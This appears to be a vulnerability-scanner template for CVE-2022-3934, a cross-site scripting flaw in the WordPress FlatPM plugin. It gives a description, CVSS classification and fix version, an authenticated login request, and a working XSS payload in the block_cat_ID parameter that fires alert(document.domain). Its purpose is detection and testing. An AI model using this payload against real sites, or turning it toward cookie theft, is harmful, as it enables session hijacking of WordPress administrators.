id: CVE-2022-3934
info:
  name: WordPress FlatPM <3.0.13 - Cross-Site Scripting
  author: r3Y3r53
  description: 'WordPress FlatPM plugin before 3.0.13 contains a cross-site scripting
    vulnerability. The plugin does not sanitize and escape certain parameters before
    outputting them back in pages, which can be exploited against high privilege users
    such as admin. An attacker can steal cookie-based authentication credentials and
    launch other attacks.

    '
  severity: medium
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    inject malicious scripts into web pages viewed by users, leading to potential
    data theft, session hijacking, or defacement of the affected website.

    '
  remediation: Fixed in version 3.0.13.
  reference:
  - https://wpscan.com/vulnerability/ab68381f-c4b8-4945-a6a5-1d4d6473b73a
  - https://nvd.nist.gov/vuln/detail/CVE-2022-3934
  - https://github.com/ARPSyndicate/kenzer-templates
  - https://github.com/ARPSyndicate/cvemon
  - https://github.com/cyllective/CVEs
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 5.4
    cve-id: CVE-2022-3934
    cwe-id: CWE-79
    epss-score: 0.00092
    epss-percentile: 0.37956
    cpe: cpe:2.3:a:mehanoid:flat_pm:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: mehanoid
    product: flat_pm
    framework: wordpress
  tags: cve2022,cve,authenticated,wpscan,xss,flatpm,wordpress,wp-plugin,mehanoid
traps:
- request:
    method: POST
    path: /wp-login.php
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: 'log={{username}}&pwd={{password}}&wp-submit=Log+In

      '
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: GET
    path: /wp-admin/admin.php?page=blocks_form&block_cat_ID=1%22+style%3Danimation-name%3Arotation+onanimationstart%3Dalert%28document.domain%29%2F%2F
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: alert(document.domain)Flat PM
